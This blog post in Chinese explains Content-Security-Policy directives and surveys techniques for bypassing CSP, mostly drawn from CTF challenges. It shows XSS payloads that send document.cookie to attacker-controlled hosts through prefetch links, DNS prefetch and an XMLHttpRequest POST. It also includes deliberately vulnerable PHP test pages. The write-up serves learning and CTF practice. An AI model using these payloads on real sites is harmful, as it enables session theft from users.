
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-CSP-CSP-Bypass" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/31/CSP-CSP-Bypass/" class="article-date">
  <time datetime="2019-10-31T08:09:22.000Z" itemprop="datePublished">2019-10-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/31/CSP-CSP-Bypass/">CSP &amp; CSP-Bypass</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了ROIS的XCTF Final wp真的感觉自己…会的太少了…，同时感觉在生活中把个人情感和个人学习分开的能力是真的重要(终于遇到了那个可爱的她了，希望一切顺利），努力锻炼自己的各个方面能力吧，希望可以变得优秀一些。</p>
<h3 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h3><p>在了解csp的bypass操作之前，需要先了解一下什么是csp。</p>
<blockquote>
<p>CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。</p>
<p>CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。</p>
<p>作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。</p>
</blockquote>
<h3 id="常见的CSP声明"><a href="#常见的CSP声明" class="headerlink" title="常见的CSP声明"></a>常见的CSP声明</h3><h4 id="指令与内容源"><a href="#指令与内容源" class="headerlink" title="指令与内容源"></a>指令与内容源</h4><p>CSP主要有三个header，分别是：Content-Security-Policy，X-Content-Security-Policy，X-WebKit-CSP。</p>
<p>平时最为常见的是Content Security Policy</p>
<p>我们对CSP的启动调用有两种方法</p>
<ul>
<li>HTTP头信息的Content-Security-Policy字段</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure>

<ul>
<li>通过网页的meta标签来定义</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面的两种CSP声明方法我们可以看出来一个CSP头是由多组CSP策略组成的，并且中间由分号相隔，每一组策略包含一个策略指令和一个内容源列表，策略指令常见如下：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>default-src</td>
<td>定义资源默认加载策略</td>
</tr>
<tr>
<td>connect-src</td>
<td>定义 Ajax、WebSocket 等加载策略</td>
</tr>
<tr>
<td>font-src</td>
<td>定义 Font 加载策略</td>
</tr>
<tr>
<td>frame-src</td>
<td>定义 Frame 加载策略</td>
</tr>
<tr>
<td>img-src</td>
<td>定义图片加载策略</td>
</tr>
<tr>
<td>media-src</td>
<td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td>
</tr>
<tr>
<td>object-src</td>
<td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td>
</tr>
<tr>
<td>script-src</td>
<td>定义 JS 加载策略</td>
</tr>
<tr>
<td>style-src</td>
<td>定义 CSS 加载策略</td>
</tr>
<tr>
<td>sandbox</td>
<td>值为 allow-forms，对资源启用 sandbox</td>
</tr>
<tr>
<td>report-uri</td>
<td>值为 /report-uri，提交日志</td>
</tr>
</tbody></table>
<p>内容源常见选项如下：</p>
<table>
<thead>
<tr>
<th>源</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td>
</tr>
<tr>
<td>*.foo.com</td>
<td>允许加载foo.com子域的资源</td>
</tr>
<tr>
<td>abc.foo.com</td>
<td>只能加载这个域名下的资源</td>
</tr>
<tr>
<td><a href="https://a.com/" target="_blank" rel="noopener">https://a.com</a></td>
<td>只能用HTTPS加载域名下的资源</td>
</tr>
<tr>
<td>https:</td>
<td>通过HTTPS可以加载任意域名下的资源</td>
</tr>
<tr>
<td>‘none’</td>
<td>代表空集,即不匹配任何URL,两侧单引号是必须的</td>
</tr>
<tr>
<td>‘self’</td>
<td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td>
</tr>
<tr>
<td>‘unsafe-inline’</td>
<td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td>
</tr>
<tr>
<td>‘unsafe-eval’</td>
<td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td>
</tr>
<tr>
<td>data:</td>
<td>允许data: URI作为内容来源</td>
</tr>
<tr>
<td>mediastream:</td>
<td>允许mediastream: URI作为内容来源</td>
</tr>
</tbody></table>
<p>补充几个lorexxar师傅博客中举的例子</p>
<h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p><strong>child-src主要限制嵌套浏览的部分（如iframe和frame标签引入的内容）</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">举一个页面的例子:</span><br><span class="line">首先设置csp</span><br><span class="line">Content-Security-Policy: child-src https://example.com/</span><br><span class="line">而下面的请求会被CSP拦截</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://not-example.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> blockedWorker = <span class="keyword">new</span> Worker(<span class="string">"data:application/javascript,..."</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p><strong>font-src指定限制所有被加载的字体资源</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">举个例子:</span><br><span class="line">Content-Security-Policy: font-src https://example.com/</span><br><span class="line">下面的请求都会返回错误</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line">    font-family: "Example Font";</span><br><span class="line">    src: url("https://not-example.com/font");</span><br><span class="line">  &#125;</span><br><span class="line">  body &#123;</span><br><span class="line">    font-family: "Example Font";</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Style-src"><a href="#Style-src" class="headerlink" title="Style-src"></a>Style-src</h4><p>style-src指令限制了所有可能被引用的css，包括下面三种引用的css属性，style也有个’unsafe-inline’这个参数，同理会允许所有的内联css。</p>
<ul>
<li>通过link标签加载css</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href="001.css" type="text/css" rel="Stylesheet"/&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过style标签加载css</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.main</span>&#123; <span class="attribute">width</span>:<span class="number">1002px</span>; <span class="attribute">margin</span>:<span class="number">0</span> auto;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过@import引入css</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; STYLE TYPE="text/css"&gt;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"example.css"</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"style/other.css"</span>;</span><br><span class="line">&lt; /STYLE&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>内联样式表</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style="font-size:10px;font-color:#ff0000"</span><br></pre></td></tr></table></figure>

<p>还有就是default-src声明的覆盖的操作，default-src是作为所有其他指令的备用的，所以可以产生覆盖的现象，比如如下的csp声明</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none'; script-src 'self'</span><br></pre></td></tr></table></figure>

<p>那么第二条就会覆盖掉第一条的default-src的声明，所以这条CSP最终的意义为</p>
<p><strong>script-src加载同源的引入内容，其他的所有指令遵从default-src的声明，为none。</strong></p>
<h3 id="Bypass-CSP"><a href="#Bypass-CSP" class="headerlink" title="Bypass-CSP"></a>Bypass-CSP</h3><h4 id="Link标签预加载Bypass-CSP"><a href="#Link标签预加载Bypass-CSP" class="headerlink" title="Link标签预加载Bypass CSP"></a>Link标签预加载Bypass CSP</h4><p>这个好像只适用于老版的浏览器了，最新版本的Google已经免疫了Prefech</p>
<p>csp.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self' 'unsafe-inline';"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//xxx"</span>&gt;</span> //Payload For Google</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//$&#123;cookie&#125;.vps_ip"</span>&gt;</span> //Payload For FireFox</span><br></pre></td></tr></table></figure>

<p>可以从下图看出我们的href去访问不同源的网站直接被defaulf-src ban掉了</p>
<p><a href="https://imgchr.com/i/Kf8PyQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/29/Kf8PyQ.md.png" alt="Kf8PyQ.md.png"></a></p>
<p>但是在老版本谷歌应该是可以的，我看很多师傅的博客都是写了一个这样的payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self' 'unsafe-inline';"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> i=<span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="actionscript">        i.setAttribute(<span class="string">'rel'</span>,<span class="string">'prefetch'</span>);</span></span><br><span class="line"><span class="javascript">        i.setAttribute(<span class="string">'href'</span>,<span class="string">'http://xx?'</span>+<span class="built_in">document</span>.cookie);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.appendChild(i);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是我在谷歌最新版本的测试情况效果和上面的图是一样的,不过在default-src没设置的情况下是可用的。</p>
<h4 id="Iframe-Bypass-Csp"><a href="#Iframe-Bypass-Csp" class="headerlink" title="Iframe Bypass Csp"></a>Iframe Bypass Csp</h4><p>这个是有一定的限制条件了，假设我们有两个页面分别为A和B,二者同源，其中一个设有CSP保护，一个没有CSP保护</p>
<p>A页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>B页面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src=<span class="string">"A页面"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'test'</span>).innerHTML),<span class="number">1000</span>);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p>从evoa师傅的博客学到了,先设置延时等待iframe子窗口加载完毕，再去获得test元素。</p>
<h4 id="Base标签-Bypass-Csp"><a href="#Base标签-Bypass-Csp" class="headerlink" title="Base标签 Bypass Csp"></a>Base标签 Bypass Csp</h4><p>RCTF2018非预期解 [<a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup]" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup]</a>(<a href="https://blog.cal1.cn/post/RCTF" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF</a> 2018 rBlog writeup)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于base-uri不会用default作为fallback,所以导致成功xss。</p>
<p><a href="https://imgchr.com/i/KffiPP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KffiPP.md.png" alt="KffiPP.md.png"></a></p>
<h4 id="浏览器补全Bypass-Csp"><a href="#浏览器补全Bypass-Csp" class="headerlink" title="浏览器补全Bypass Csp"></a>浏览器补全Bypass Csp</h4><p>CSP设置如下</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure>

<p>新版本浏览器似乎又使很多操作失效了，比如</p>
<p><a href="https://imgchr.com/i/Khqla8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/Khqla8.md.png" alt="Khqla8.md.png"></a></p>
<p>这个是之前大师傅们博客中的操作</p>
<p>但是我在谷歌和火狐似乎都失败了，我的测试代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-abc'"</span>&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;script nonce=<span class="string">"abc"</span>&gt;document.write(<span class="string">'CSP'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>火狐下</p>
<p><a href="https://imgchr.com/i/KhLhXn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KhLhXn.md.png" alt="KhLhXn.md.png"></a></p>
<p>本来文章中的双引号闭合并没有出现，当然这是在p标签中插入的情况下，如果没有p标签的约束呢</p>
<p>比如evoA师傅中博客中的例子</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'xxxxx'</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//do some thing</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KhjYkV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KhjYkV.md.png" alt="KhjYkV.md.png"></a></p>
<p>在没有p标签的情况下我们的确可以xss，不过加了p标签就不闭合了</p>
<p>不过在我们在script的type为text/javascript的情况下是可以xss的，有点神奇，不过依然只是对Firefox有效</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>  nonce=<span class="string">'xxxxx'</span>&gt;</span><br><span class="line">  <span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/K4mJW4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K4mJW4.md.png" alt="K4mJW4.md.png"></a></p>
<p><img src="https://s2.ax1x.com/2019/10/30/K4mrFO.png" alt="K4mrFO.png"></p>
<p>很明显可以看出来…和google的自闭和不太一样</p>
<p>思考：为什么多了一个p标签的话，本来的<code>&lt;script src=&quot;data:text/plain,alert(1)&quot; a=</code>就失效了</p>
<p>下面是一组对比</p>
<p><a href="https://imgchr.com/i/K4f5QK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K4f5QK.md.png" alt="K4f5QK.md.png"></a></p>
<p>右图可xss，左图无法xss，个人感觉是因为a后面是自动添加的双引号，这个双引号只能去自动闭合一个不完整的标签，比如闭合<code>&lt;/p&gt;</code>中的&lt;/p，和&lt;script，以后如果有更好的研究的话可以重新来看一下这个问题。</p>
<p>可以看到在type=”text/javascript”的情况下，如果我们不自己添加双引号的浏览器自添加效果为</p>
<p><a href="https://imgchr.com/i/K44GNj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K44GNj.md.png" alt="K44GNj.md.png"></a></p>
<p>这个的Bypass还是主要通过自己添加一个双引号，比如a=”，浏览器给的闭合可能直接是<code>a=&quot;&lt;/p&gt;&lt;script&quot;</code>，不过现在不在type=”text/javascript’’的情况下去使用这个payload，直接报错了。</p>
<p><a href="https://imgchr.com/i/K444bD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K444bD.md.png" alt="K444bD.md.png"></a></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="通过文件上传Bypass-CSP"><a href="#通过文件上传Bypass-CSP" class="headerlink" title="通过文件上传Bypass CSP"></a>通过文件上传Bypass CSP</h4><p>比如cctf 2016</p>
<p>上传swf文件如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CWS</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest(); xml.open(<span class="string">'POST'</span>, <span class="string">'http://xss.xxxxx.cc'</span>, <span class="literal">true</span>); xml.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>); xml.send(<span class="string">'cookie='</span>+<span class="built_in">document</span>.cookie); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过import引入 加载</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'import'</span> <span class="attr">href</span>=<span class="string">'/upload/xxxxx'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在l3m0n师傅的博客中看到，如果遇到这种情况，上传只能上传到upload目录，但是csp限制只能在static目录下加载js</p>
<p>HITCON2016</p>
<p>payload 如下，通过%2f bypass</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p>个人对这个payload的理解的话就是因为%2f在未解吗之前是属于static目录下的资源，经过src的调用，%2f解码为/，最终实际调用了upload目录下面的资源。</p>
<p>还有梅子酒师傅的[<a href="https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]</a>(<a href="https://meizjm3i.github.io/2018/05/12/Use" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use</a> Wave File Bypass CSP/)</p>
<p>通过wave文件Bypass CSP</p>
<h4 id="302跳转Bypass-CSP"><a href="#302跳转Bypass-CSP" class="headerlink" title="302跳转Bypass CSP"></a>302跳转Bypass CSP</h4><p>CSP规则如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src 'self'; script-src http://sguestbook.hctf.io/static/ 'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</span><br></pre></td></tr></table></figure>

<ul>
<li><p>script-src只允许加载static目录下的js，static下有一个redirect.php</p>
<p>写一个js上传，通过302跳转Bypass掉CSP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d"</span>&gt;&lt;<span class="regexp">/scriscriptpt&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>当然，我们之前说的那个payload也可以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/121778.html</a></p>
<h4 id="JSONP-Bypass-CSP"><a href="#JSONP-Bypass-CSP" class="headerlink" title="JSONP Bypass CSP"></a>JSONP Bypass CSP</h4><p><a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere</a></p>
<p>很有趣的题，看了一遍感觉学到了很多</p>
<p>通过第一个iframe的callback，调用父窗口改写第二个iframe的内容，从而加载第一个中documen.write,最终加载了我们vps上的恶意文件</p>
<p>因为csp的白名单上有Google，所以我们可以通过寻找google上的jsonp的回调函数点配合注释，执行任意js</p>
